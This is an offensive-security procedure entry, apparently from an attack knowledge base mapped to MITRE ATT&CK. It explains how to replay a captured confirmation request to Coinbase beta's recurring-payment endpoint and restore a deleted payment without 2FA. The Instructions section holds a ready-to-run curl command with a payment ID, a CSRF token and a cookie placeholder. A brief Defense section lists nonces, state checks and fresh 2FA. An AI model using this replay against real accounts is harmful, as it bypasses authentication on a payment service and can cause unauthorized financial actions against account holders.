---
id: proc-coinbase-replay-confirm-001
tags:
  - replay-attack
  - auth-bypass
  - 2fa-bypass
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Defense Evasion]]'
commands:
  - '[[commands/replay-coinbase-payment-confirmation]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
  - '[[Modify Authentication Process]]'
updated_at: '2025-12-14T17:31:31.044Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Defense Evasion]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[Modify Authentication Process]]'
---
# Replay-Coinbase-Payment-Confirmation-Request

## Summary

This procedure replays a captured HTTP POST request to restore a deleted recurring payment on Coinbase beta without re-entering 2FA, exploiting absent replay protections.

## Description

Using the previously captured confirmation request, resend it to /recurring_payments/{id}/confirm after deletion. The endpoint fails to validate payment state or prevent replays, treating it as a valid patch. This bypasses 2FA for restoration, potentially allowing unauthorized reactivation if requests are intercepted (mitigated somewhat by TLS). Prerequisites include a valid session; outcomes: payment restored silently.

## Requirements

1. Captured original confirmation request (headers, body, cookies)
2. Valid session post-deletion
3. Tool for HTTP request replay (e.g., curl)

## Defense

Defensive measures and detection strategies:

- Add idempotency tokens or nonces to requests
- Validate payment state (e.g., check not deleted) before processing
- Require fresh 2FA for state-changing actions like restoration
- Monitor for duplicate request patterns in logs

## Objectives

1. Restore deleted payment without authentication
2. Demonstrate auth bypass via replay
3. Highlight risks of request interception

## Instructions

### Step 1: Prepare Captured Request

**Context**: Review and adapt the saved POST request, ensuring session cookies and CSRF token are current.

Replace {id} with the payment ID (e.g., 58087a3d6861ee015644fc48).

> Verify body: utf8=%E2%9C%93&_method=patch

### Step 2: Execute Replay

**Context**: Send the exact request to bypass state checks and restore the payment.

**Command** ([[commands/replay-coinbase-payment-confirmation]]):
```bash
curl -X POST 'https://beta.coinbase.com/recurring_payments/58087a3d6861ee015644fc48/confirm' \
  -H 'Host: beta.coinbase.com' \
  -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:51.0) Gecko/20100101 Firefox/51.0' \
  -H 'Accept: */*;q=0.5, text/javascript, application/javascript, application/ecmascript, application/x-ecmascript' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate, br' \
  -H 'Referer: https://beta.coinbase.com/recurring_payments' \
  -H 'X-NewRelic-ID: XA4HVVZTGwIAVFVXBAAG' \
  -H 'X-CSRF-Token: /hSt/DD82VwI6ks+4P0VTHTDULz5EhHKowGAGfryWcVCZd47s+rQZDCgr70pJK4EeFHkKWRd0SJbVq1K64IZLA==' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'X-Requested-With: XMLHttpRequest' \
  -H 'Cookie: [insert full cookie string]' \
  -d 'utf8=%E2%9C%93&_method=patch'
```

> Successful response (HTTP 200) indicates restoration; check UI for active payment without 2FA prompt.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access
- [[Defense Evasion]] Defense Evasion

### Techniques

- [[Valid Accounts]] Valid Accounts
- [[Modify Authentication Process]] Modify Authentication Process

### Sub-Techniques


## Commands Used

- [[commands/replay-coinbase-payment-confirmation]]

## Tools Used


## Tags

- replay-attack
- auth-bypass
- 2fa-bypass
